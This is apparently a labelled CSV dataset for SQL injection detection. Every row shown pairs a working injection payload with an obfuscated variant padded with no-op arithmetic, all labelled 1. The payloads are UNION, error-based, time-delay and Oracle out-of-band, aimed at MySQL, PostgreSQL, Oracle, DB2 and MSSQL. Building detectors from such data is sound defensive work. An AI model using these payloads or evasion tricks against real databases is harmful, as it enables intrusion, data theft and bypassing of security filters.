,Query,Label,Original
1628,"1 ""  )   as zhlf where  8-8+4119+2/2-1=SIN(0)+4119+8-8+0+0 Or SIN(0) OR  2/2-1+0+5286+SIN(0)=(+2/2-1+2*3-6  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- ",1,"1""  )   as zhlf where 4119  =  4119 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
1629, (  select   (  case when   (   2*3-6+9263+2/2-1+SIN(0)+8-8=2*3-6+9263+2/2-1+2*3-6+2/2-1  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    )  ,1, (  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) 
1630,"1'   )    )     )   and 1 And  8-8+8514+0=2/2-1+2/2-1+0+0+(+SIN(0)  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (   8-8+0+0+'ofko'=0+SIN(0)+'ofko+8-8+2*3-6+0 ",1,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'ofko'  =  'ofko"
1631,"1  )   aNd 1 aND char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80   )+2*3-6+2/2-1=0+regexp_substring+2*3-6+2*3-6  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- ",1,"1  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"
1632,-4607'||  (  select 'wkdg' where  2*3-6+0+0+7524+0+0=SIN(0)+7524+8-8+0 order by 1-- ,1,-4607'||  (  select 'wkdg' where 7524  =  7524 order by 1--
1633,"1  )   or SIN(0) OR 2/2-1 oR  2/2-1+2*3-6+2633+8-8=8-8+0+dbms_pipe.receive_message+2*3-6  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   And 1 aNd   (   2*3-6+8898+8-8=0+2/2-1+8898+0+2*3-6 ",1,"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  8898  =  8898"
1634,"1'  )   and 1 aNd  8-8+8514+SIN(0)+2*3-6+0=8-8+(+2*3-6  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (   SIN(0)+'vgkt'+0+2/2-1+2/2-1=8-8+'vgkt+8-8+2*3-6 ",1,"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'vgkt'  =  'vgkt"
1635,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    aND 1 And    (    (    ""% "" 0++8-8+2/2-1=0+2/2-1+ "" ",1,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """
1636,1 where  SIN(0)+8-8+6223+8-8+2/2-1=2*3-6+2*3-6+8-8+6223+0 rlike sleep  (  5  )  # ,1,1 where 6223  =  6223 rlike sleep  (  5  )  #
1637,"1'||  (  select 'ymez' from dual where  SIN(0)+9870+2*3-6+0+8-8=0+SIN(0)+0+9870+SIN(0)+8-8 OR 8-8 oR 2*3-6 or  2/2-1+2/2-1+8-8+7417+0+2/2-1=2*3-6+2/2-1+(  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- ",1,"1'||  (  select 'ymez' from dual where 9870  =  9870 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
1638,"1   )    )    AND 1 aNd updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (   2/2-1+3393+2*3-6=0+SIN(0)+3393,1+SIN(0)   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (    SIN(0)+2*3-6+5524+8-8=5524+0+8-8 ",1,"1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524"
1639,"1% ""   )    )    aND 1 and  6537+2/2-1+0=2/2-1+0+2/2-1+0+dbms_pipe.receive_message+2*3-6  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (    ""% "" SIN(0)+2/2-1++2/2-1+SIN(0)=+0+2*3-6 "" ",1,"1%""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""%""  =  """
1640,-5962   )    )    as jbqv where  0+8-8+0+2583+8-8=2/2-1+0+8-8+2583+8-8+8-8 OR 8-8 Or 2*3-6 or  8-8+2/2-1+8-8+7496=SIN(0)+8-8+8560--+SIN(0)+SIN(0)+SIN(0) ,1,-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--
1641,"-1244  )   as qszw where  2/2-1+2*3-6+SIN(0)+2332+SIN(0)+2*3-6=2*3-6+2332+SIN(0)+2/2-1+2*3-6 union all select 2332,2332,2332,2332# ",1,"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#"
1642,"1% "" or 0 OR row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   2*3-6+2/2-1+1045+SIN(0)=8-8+1045,1+SIN(0)   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 1 AND 1 and  ""% "" 2/2-1++2/2-1=2*3-6++2/2-1 "" ",1,"1%"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""%""  =  """
1643,"1 "" aNd 1 AND row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   2/2-1+0+6237+SIN(0)+2/2-1+0=2/2-1+6237,1+SIN(0)+2*3-6+0+2/2-1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and  ""nzgn "" SIN(0)+0+2*3-6+2/2-1++2*3-6=8-8+8-8+0++0 ""nzgn ",1,"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn"
1644, (  select   (  case when   (   0+9856+2/2-1=0+8-8+9856+0+0+8-8  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    )  ,1, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) 
1645,"1 ""   )    )    as mlid where  8-8+2*3-6+2/2-1+1047=1047+SIN(0)+SIN(0)+SIN(0) union all select null,null# ",1,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#"
1646,"1% ""   )    )     )   Or 2/2-1 Or  2*3-6+4915+2/2-1+8-8+8-8+2/2-1=8-8+SIN(0)+(+2*3-6+8-8+2/2-1  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- ",1,"1%""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"
1647,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 AND 1 aNd 1 aNd   (   0+0+'%'+2/2-1+0+2/2-1=2*3-6+0+8-8+'+SIN(0)+0 ",1,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '"
1648,-7532   )    )     )   Or 2*3-6 || 2/2-1 oR SIN(0) Or  SIN(0)+4493+2/2-1+2*3-6+SIN(0)+2/2-1=SIN(0)+2*3-6+utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (   2/2-1+SIN(0)+4493+2*3-6+0=SIN(0)+2*3-6+4493+2*3-6  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aND 1 aND    (    (     (   SIN(0)+8332+2*3-6+0+SIN(0)+8-8=8332+2/2-1+2*3-6 ,1,-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332
1649,"1 ""   )    )    union all select null,null,null,null,null,null,null,null,null-- ",1,"1""   )    )    union all select null,null,null,null,null,null,null,null,null--"
1650,"1 ""  )   where  SIN(0)+2*3-6+1001+8-8=8-8+0+2*3-6+2/2-1+2*3-6+1001 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  # ",1,"1""  )   where 1001  =  1001 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"
1651,"1'   )    )     )   or 8-8 or 2/2-1 Or  2/2-1+SIN(0)+2633=SIN(0)+SIN(0)+dbms_pipe.receive_message+SIN(0)+SIN(0)+SIN(0)  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   aNd 1 AND    (    (     (   2*3-6+'xwhi'+0=SIN(0)+SIN(0)+'xwhi+8-8+8-8 ",1,"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'xwhi'  =  'xwhi"
1652,1'   )    )    and 1 aND  2/2-1+6969+2*3-6+0+2/2-1=(+0+SIN(0)  select 6969 from pg_sleep  (  5   )    )    and    (    (    2*3-6+8-8+'prjf'+2/2-1=0+8-8+SIN(0)+'prjf+0+2*3-6 ,1,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf
1653,1'  )   as jdmh where  SIN(0)+2*3-6+6175+0+8-8+2*3-6=8-8+0+8-8+6175 rlike sleep  (  5  )  # ,1,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #
1654,"1% ""   )    )     )   oR SIN(0) OR 8-8 or  8-8+0+1022+0+8-8=8-8+(+2/2-1+2/2-1+8-8  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- ",1,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
1655,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   And 1 aND 1 aNd   (   ""qwdi "" +2*3-6+8-8+8-8+8-8=2*3-6+2/2-1+SIN(0)+SIN(0)++0 ""qwdi ",1,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi"
1656,1' in boolean mode  )   union all select null-- ,1,1' in boolean mode  )   union all select null--
1657,"-3071   )    )    as uiiu where  2*3-6+2/2-1+0+8910+8-8=2/2-1+2*3-6+SIN(0)+8910+2/2-1+SIN(0) union all select 8910,8910,8910,8910,8910,8910,8910# ",1,"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#"
1658,"1 ""   )    )    as tgwp where  9405+2/2-1+8-8=0+0+9405+SIN(0) ",1,"1""   )    )    as tgwp where 9405  =  9405"
1659,1 where  2*3-6+2/2-1+5161+8-8=0+5161+2/2-1 aNd 1 and  2/2-1+8-8+8-8+2*3-6+3754=0+2*3-6+(+2*3-6  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  || 2/2-1 Or  (  select   (  case when   (   SIN(0)+2*3-6+0+0+3754+8-8=2*3-6+3754+2*3-6  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- ,1,1 where 5161  =  5161 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --
1660,1   )    )     )   rlike   (  select   (  case when   (   2/2-1+SIN(0)+4367+2/2-1=0+6879+2*3-6+2*3-6  )   then 1 else 0x28 end   )    )    and 1 and    (    (     (   0+2542+8-8+2/2-1+2/2-1=2/2-1+8-8+8-8+0+2542+SIN(0) ,1,1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542
1661,"1 ""  )   as rovd where  0+0+0+3764+2/2-1=3764+2*3-6+SIN(0) aNd 1 and elt  (   2*3-6+8-8+2/2-1+4249+0+8-8=8-8+4249,7259+0+2/2-1  )  -- ",1,"1""  )   as rovd where 3764  =  3764 and elt  (  4249  =  4249,7259  )  --"
1662,select sleep  (  5  )   aNd 1 AND   (  'dcys' like 'dcys ,1,select sleep  (  5  )   and   (  'dcys' like 'dcys
1663,1  )   as msat where  2/2-1+8-8+1267+2*3-6+2*3-6=2/2-1+SIN(0)+8-8+8-8+1267+2/2-1 ,1,1  )   as msat where 1267  =  1267
1664,1 aNd 1 And 1 aNd  2/2-1+4386+0+8-8=SIN(0)+utl_inaddr.get_host_address+0  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  || 2*3-6 OR  (  select   (  case when   (   2/2-1+4386+SIN(0)+0=SIN(0)+0+4386+2/2-1  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )  ,1,1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) 
1665,"1% ""  )   And 1 aNd char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90   SIN(0)+)+2/2-1=SIN(0)+0+regexp_substring+8-8+2*3-6  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  -- ",1,"1%""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --"
1666,1 where  SIN(0)+SIN(0)+8506+SIN(0)+SIN(0)=2/2-1+8-8+8506+2/2-1 ,1,1 where 8506  =  8506
1667,1'  )   as qcse where  2/2-1+8-8+4147+8-8+2/2-1+SIN(0)=2/2-1+4147+2/2-1+SIN(0)+8-8+0 waitfor delay '0:0:5'-- ,1,1'  )   as qcse where 4147  =  4147 waitfor delay '0:0:5'--
1668,1'  )   as inid where  2*3-6+2/2-1+7812=2*3-6+SIN(0)+2/2-1+2/2-1+7812+2/2-1 OR 2/2-1 OR 8-8 OR  6793+SIN(0)+8-8=2*3-6+8-8+(+2/2-1+2/2-1+2*3-6  select 6793 from pg_sleep  (  5   )    )   -- ,1,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
1669,"1%'   )    )     )   and 1 And  2/2-1+2*3-6+8407+2/2-1+0+2/2-1=SIN(0)+(+0+SIN(0)+2*3-6+2/2-1  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (   0+SIN(0)+'%'+8-8=2*3-6+'+2/2-1 ",1,"1%'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '"
1670,"1'  )   where  SIN(0)+2*3-6+1577+0=1577+SIN(0)+0+0 union all select null,null,null,null,null,null# ",1,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#"
1671,waitfor delay '0:0:5' and 1 AND    (    (    0+2*3-6+'nvqf'+2*3-6+2/2-1+8-8=0+'nvqf+SIN(0) ,1,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf
1672,"1 ""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (   8-8+SIN(0)+5840+0+2/2-1+SIN(0)=5840+2*3-6+0+SIN(0)+2/2-1+2*3-6  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 1 And    (    (     (   ""ftjg "" +2/2-1+8-8=+2*3-6+SIN(0)+2*3-6 ""ftjg ",1,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg"
1673," end aND 1 and  ""xouo "" like  ""xouo ",1," end and ""xouo"" like ""xouo"
1674,"1' or 2/2-1 Or 2/2-1 oR row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   SIN(0)+2*3-6+2/2-1+1045=2/2-1+2*3-6+1045,1+2*3-6   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   aND 1 And  2*3-6+0+0+'yvzf'='yvzf+0+2/2-1 ",1,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf"
1675,1' where  2*3-6+2/2-1+7036+2/2-1+2*3-6=2*3-6+7036+2/2-1 ,1,1' where 7036  =  7036
1676,1'||  (  select 'goen' from dual where  2*3-6+8586+2/2-1+0=8-8+SIN(0)+0+8-8+8586+0 ,1,1'||  (  select 'goen' from dual where 8586  =  8586
1677,select case when  2*3-6+0+2640+2/2-1+SIN(0)=8-8+0+9249 then 1 else null end-- ,1,select case when 2640  =  9249 then 1 else null end--
1678,"1' where  8-8+1836+2/2-1+0=SIN(0)+0+1836+2*3-6+2/2-1+0 OR 2*3-6 OR 8-8 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121   2*3-6+)+8-8+8-8=regexp_substring+0+2*3-6+2/2-1  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  -- ",1,"1' where 1836  =  1836 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --"
1679,1'   )    )    as mqnv where  2/2-1+8-8+9831+SIN(0)+SIN(0)=9831+2/2-1+0 ,1,1'   )    )    as mqnv where 9831  =  9831
1680,if  (   0+8-8+SIN(0)+5896+2/2-1=4251+2/2-1+SIN(0)+2/2-1+SIN(0)+2*3-6  )   select 5896 else drop function xmyk-- ,1,if  (  5896  =  4251  )   select 5896 else drop function xmyk--
1681,select   (  case when   (   2/2-1+8-8+SIN(0)+0+8331=SIN(0)+5625+0+2*3-6  )   then 8331 else 8331*  (  select 8331 from mysql.db  )   end  )  # ,1,select   (  case when   (  8331  =  5625  )   then 8331 else 8331*  (  select 8331 from mysql.db  )   end  )  #
1682,1'  )   aNd 1 and  SIN(0)+2/2-1+3560+0=2*3-6+5467--+SIN(0)+0 ,1,1'  )   and 3560  =  5467--
1683,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 1 aNd 1 aNd    (    (     (   2*3-6+SIN(0)+'%'+8-8+SIN(0)=8-8+'+0+2*3-6 ",1,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '"
1684,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073-- ",1,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--"
1685,-8513' union all select 7414-- ,1,-8513' union all select 7414--
1686,"-9934 ""  )   or 8-8 Or  2*3-6+5023+SIN(0)+2*3-6+0+2/2-1=ctxsys.drithsx.sn+8-8+8-8  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  oR 2/2-1 oR  (  select   (  case when   (   SIN(0)+5023+2*3-6+0+2/2-1=5023+2*3-6+2/2-1+2*3-6+2*3-6  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aNd 1 and   (   ""xecb "" like  ""xecb ",1,"-9934""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""xecb"" like ""xecb"
1687,"1% ""   )    )    And 1 and  SIN(0)+8-8+0+8514=2*3-6+(+2*3-6  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (    ""% "" 0++SIN(0)+2*3-6=2*3-6+2*3-6++0+8-8 "" ",1,"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """
1688,1'   )    )    as ypgz where  2*3-6+0+SIN(0)+8-8+8704=0+0+0+8704+2/2-1 ,1,1'   )    )    as ypgz where 8704  =  8704
1689,"-5726% ""   )    )    or 2*3-6 || 2/2-1 Or 8-8 oR  8-8+6872+0=6872+2/2-1+0+2*3-6 AND 1 And    (    (    ""% "" 0+0+=2/2-1+8-8+SIN(0)+2/2-1++2/2-1 "" ",1,"-5726%""   )    )    or 6872  =  6872 and    (    (   ""%""  =  """
1690,"1%'   )    )     )   aNd 1 and elt  (   2*3-6+4249+2*3-6=2/2-1+2*3-6+8-8+4249,7259+2*3-6+2/2-1  )   and    (    (     (   2*3-6+2/2-1+2/2-1+'%'+2*3-6+8-8=0+8-8+'+2*3-6+8-8+0 ",1,"1%'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  '%'  =  '"
1691,1 where  SIN(0)+1299+8-8+SIN(0)+8-8=2/2-1+1299+2/2-1+8-8+2*3-6 ,1,1 where 1299  =  1299
1692,1   )    )    AND 1 AND sleep  (  5  )  # ,1,1   )    )    and sleep  (  5  )  #
1693,-6529'  )   or 8-8 OR   (   4309+0+2*3-6+2*3-6+8-8=2*3-6+0+1601+2*3-6+2/2-1+0  )  *1601 ,1,-6529'  )   or   (  4309  =  1601  )  *1601
1694,"1'   )    )     )   or 8-8 OR 0 ||  8-8+5286+SIN(0)+0+2/2-1=SIN(0)+(+8-8+8-8+SIN(0)  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   AND 1 aND    (    (     (  'xdui' like 'xdui ",1,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'xdui' like 'xdui"
1695,select pg_sleep  (  5  )  -- ojzt ,1,select pg_sleep  (  5  )  -- ojzt
1696,begin dbms_lock.sleep  (  5  )  ,1,begin dbms_lock.sleep  (  5  ) 
1697,-9202' where  2/2-1+2/2-1+9799+2*3-6+2/2-1+2*3-6=2/2-1+8-8+9799+8-8+8-8 OR 0 or  2*3-6+8-8+SIN(0)+2*3-6+4747+8-8=SIN(0)+2*3-6+dbms_utility.sqlid_to_sqlhash+8-8+2/2-1+2*3-6   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  || SIN(0) oR  (  select   (  case when   (   8-8+4747+SIN(0)+2/2-1+0=2/2-1+4747+8-8+2*3-6+0+2*3-6  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- ,1,-9202' where 9799  =  9799 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --
